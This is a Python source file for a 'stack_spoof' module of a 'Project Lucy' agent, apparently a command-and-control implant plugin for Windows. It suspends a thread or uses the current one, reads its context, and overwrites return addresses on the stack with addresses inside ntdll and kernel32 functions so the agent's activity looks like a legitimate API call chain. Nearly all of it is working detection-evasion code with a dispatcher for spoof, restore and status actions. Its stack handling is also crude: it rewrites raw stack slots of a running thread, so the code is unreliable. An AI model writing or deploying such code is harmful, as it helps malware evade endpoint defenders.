"""
Thread stack spoofing module for Project Lucy agent.
Spoofs the current thread's call stack to look like it originated from
a legitimate Windows API call chain rather than the agent binary.
Actions: spoof, restore, status, spoof_thread.
"""
import ctypes
import platform
import struct

name = "stack_spoof"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# State tracking
_spoofed = False
_spoofed_thread_id = None
_original_return_addresses: list[dict] = []

# Win32 constants
CONTEXT_AMD64 = 0x00100000
CONTEXT_CONTROL = (CONTEXT_AMD64 | 0x00000001)
CONTEXT_FULL = (CONTEXT_AMD64 | 0x00000007)


def _get_kernel32():
    return ctypes.windll.kernel32


def _get_ntdll():
    return ctypes.windll.ntdll


# --- ctypes structures -------------------------------------------------------

class M128A(ctypes.Structure):
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]


class CONTEXT(ctypes.Structure):
    """Simplified x64 CONTEXT structure (first ~120 bytes used for control regs)."""
    _fields_ = [
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        ("ContextFlags", ctypes.c_uint32),
        ("MxCsr", ctypes.c_uint32),
        ("SegCs", ctypes.c_ushort),
        ("SegDs", ctypes.c_ushort),
        ("SegEs", ctypes.c_ushort),
        ("SegFs", ctypes.c_ushort),
        ("SegGs", ctypes.c_ushort),
        ("SegSs", ctypes.c_ushort),
        ("EFlags", ctypes.c_uint32),
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        ("Rip", ctypes.c_uint64),
    ]


# --- Helper functions --------------------------------------------------------

def _get_legitimate_addresses():
    """
    Get addresses from legitimate modules (ntdll, kernel32) to use as
    spoofed return addresses. We pick addresses from the middle of
    common functions so they look like legitimate call chain entries.
    """
    kernel32 = _get_kernel32()
    ntdll = _get_ntdll()

    legit_addrs = []

    # Collect function addresses from ntdll
    ntdll_funcs = [
        b"RtlAllocateHeap",
        b"RtlFreeHeap",
        b"NtQueryInformationProcess",
        b"RtlInitString",
        b"LdrLoadDll",
        b"RtlGetVersion",
    ]
    ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
    for func_name in ntdll_funcs:
        addr = kernel32.GetProcAddress(ntdll_base, func_name)
        if addr:
            # Use address + some offset to look like a return address
            # (mid-function, not the start)
            legit_addrs.append(addr + 0x20)

    # Collect function addresses from kernel32
    k32_funcs = [
        b"CreateFileA",
        b"ReadFile",
        b"WriteFile",
        b"CloseHandle",
        b"GetLastError",
        b"Sleep",
        b"VirtualAlloc",
        b"LoadLibraryA",
    ]
    k32_base = kernel32.GetModuleHandleA(b"kernel32.dll")
    for func_name in k32_funcs:
        addr = kernel32.GetProcAddress(k32_base, func_name)
        if addr:
            legit_addrs.append(addr + 0x18)

    return legit_addrs


def _read_qword(address):
    """Read a 64-bit value from memory."""
    return ctypes.c_uint64.from_address(address).value


def _write_qword(address, value):
    """Write a 64-bit value to memory."""
    ctypes.c_uint64.from_address(address).value = value


def _walk_stack(rsp, max_frames=16):
    """
    Walk the stack from RSP and collect return addresses.
    Returns list of {stack_address, return_address}.
    """
    frames = []
    kernel32 = _get_kernel32()

    # Get module bounds to identify return addresses
    ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
    k32_base = kernel32.GetModuleHandleA(b"kernel32.dll")

    # Read stack memory in chunks
    for i in range(max_frames):
        stack_addr = rsp + i * 8
        try:
            ret_addr = _read_qword(stack_addr)
            frames.append({
                "stack_address": stack_addr,
                "return_address": ret_addr,
                "index": i,
            })
        except Exception:
            break

    return frames


def _spoof_current_thread() -> dict:
    """Spoof the current thread's call stack."""
    global _spoofed, _original_return_addresses, _spoofed_thread_id

    if _spoofed:
        return {
            "status": "completed",
            "data": {"spoofed": True, "message": "Stack already spoofed"},
        }

    kernel32 = _get_kernel32()
    ntdll = _get_ntdll()

    try:
        # Get current thread handle
        thread_handle = kernel32.GetCurrentThread()
        thread_id = kernel32.GetCurrentThreadId()

        # Get thread context
        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_FULL
        ntdll.NtGetContextThread(thread_handle, ctypes.byref(ctx))

        rsp = ctx.Rsp

        # Get legitimate addresses for spoofing
        legit_addrs = _get_legitimate_addresses()
        if len(legit_addrs) < 4:
            return {"status": "failed", "error": "Could not collect enough legitimate addresses"}

        # Walk the stack and collect original return addresses
        frames = _walk_stack(rsp, max_frames=16)

        # Save original return addresses for restoration
        _original_return_addresses = []

        # Determine which stack entries look like return addresses
        # (point to executable memory in known modules)
        ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
        k32_base = kernel32.GetModuleHandleA(b"kernel32.dll")

        # Get module size estimates (use 16MB as upper bound)
        def _in_module(addr, base):
            if not base or not addr:
                return False
            return base <= addr < base + 0x1000000

        spoofed_count = 0
        for frame in frames:
            ret_addr = frame["return_address"]
            stack_addr = frame["stack_address"]

            # Check if this looks like a return address (points to a module)
            is_ret_addr = (
                _in_module(ret_addr, ntdll_base) or
                _in_module(ret_addr, k32_base)
            )

            if is_ret_addr:
                # Save original
                _original_return_addresses.append({
                    "stack_address": stack_addr,
                    "original_return": ret_addr,
                })

                # Overwrite with a legitimate address
                spoof_addr = legit_addrs[spoofed_count % len(legit_addrs)]
                _write_qword(stack_addr, spoof_addr)
                spoofed_count += 1

        _spoofed = True
        _spoofed_thread_id = thread_id

        return {
            "status": "completed",
            "data": {
                "spoofed": True,
                "thread_id": thread_id,
                "rsp": hex(rsp),
                "frames_scanned": len(frames),
                "addresses_spoofed": spoofed_count,
                "original_addresses_saved": len(_original_return_addresses),
                "legit_addresses_available": len(legit_addrs),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Stack spoofing failed: {exc}"}


def _restore_stack() -> dict:
    """Restore the original call stack."""
    global _spoofed, _original_return_addresses, _spoofed_thread_id

    if not _spoofed:
        return {"status": "failed", "error": "Stack is not spoofed"}

    try:
        restored_count = 0
        for entry in _original_return_addresses:
            try:
                _write_qword(entry["stack_address"], entry["original_return"])
                restored_count += 1
            except Exception:
                pass

        _spoofed = False
        saved_thread_id = _spoofed_thread_id
        _spoofed_thread_id = None
        _original_return_addresses = []

        return {
            "status": "completed",
            "data": {
                "restored": True,
                "thread_id": saved_thread_id,
                "addresses_restored": restored_count,
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Stack restore failed: {exc}"}


def _status() -> dict:
    """Check if stack is currently spoofed."""
    return {
        "status": "completed",
        "data": {
            "spoofed": _spoofed,
            "thread_id": _spoofed_thread_id,
            "saved_addresses": len(_original_return_addresses),
        },
    }


def _spoof_thread(thread_id) -> dict:
    """Spoof a specific thread's call stack."""
    if not thread_id:
        return {"status": "failed", "error": "Missing 'thread_id' parameter"}

    try:
        thread_id = int(thread_id)
    except (ValueError, TypeError):
        return {"status": "failed", "error": "thread_id must be an integer"}

    global _spoofed, _original_return_addresses, _spoofed_thread_id

    kernel32 = _get_kernel32()
    ntdll = _get_ntdll()

    try:
        # Open the target thread
        THREAD_GET_CONTEXT = 0x0008
        THREAD_SET_CONTEXT = 0x0010
        THREAD_QUERY_INFORMATION = 0x0040

        thread_handle = kernel32.OpenThread(
            THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
            False,
            thread_id,
        )
        if not thread_handle:
            raise ctypes.WinError(ctypes.get_last_error())

        # Suspend the thread to safely modify its context
        kernel32.SuspendThread(thread_handle)

        # Get thread context
        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_FULL
        ntdll.NtGetContextThread(thread_handle, ctypes.byref(ctx))

        rsp = ctx.Rsp

        # Get legitimate addresses
        legit_addrs = _get_legitimate_addresses()
        if len(legit_addrs) < 4:
            kernel32.ResumeThread(thread_handle)
            kernel32.CloseHandle(thread_handle)
            return {"status": "failed", "error": "Could not collect enough legitimate addresses"}

        # Walk and spoof the stack
        frames = _walk_stack(rsp, max_frames=16)

        ntdll_base = kernel32.GetModuleHandleA(b"ntdll.dll")
        k32_base = kernel32.GetModuleHandleA(b"kernel32.dll")

        def _in_module(addr, base):
            if not base or not addr:
                return False
            return base <= addr < base + 0x1000000

        _original_return_addresses = []
        spoofed_count = 0

        for frame in frames:
            ret_addr = frame["return_address"]
            stack_addr = frame["stack_address"]

            is_ret_addr = (
                _in_module(ret_addr, ntdll_base) or
                _in_module(ret_addr, k32_base)
            )

            if is_ret_addr:
                _original_return_addresses.append({
                    "stack_address": stack_addr,
                    "original_return": ret_addr,
                })
                spoof_addr = legit_addrs[spoofed_count % len(legit_addrs)]
                _write_qword(stack_addr, spoof_addr)
                spoofed_count += 1

        # Resume the thread
        kernel32.ResumeThread(thread_handle)
        kernel32.CloseHandle(thread_handle)

        _spoofed = True
        _spoofed_thread_id = thread_id

        return {
            "status": "completed",
            "data": {
                "spoofed": True,
                "thread_id": thread_id,
                "rsp": hex(rsp),
                "frames_scanned": len(frames),
                "addresses_spoofed": spoofed_count,
                "original_addresses_saved": len(_original_return_addresses),
            },
        }
    except Exception as exc:
        return {"status": "failed", "error": f"Thread spoofing failed: {exc}"}


def run(action: str = "status", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only"}

    try:
        if action == "spoof":
            return _spoof_current_thread()
        elif action == "restore":
            return _restore_stack()
        elif action == "status":
            return _status()
        elif action == "spoof_thread":
            return _spoof_thread(params.get("thread_id"))
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
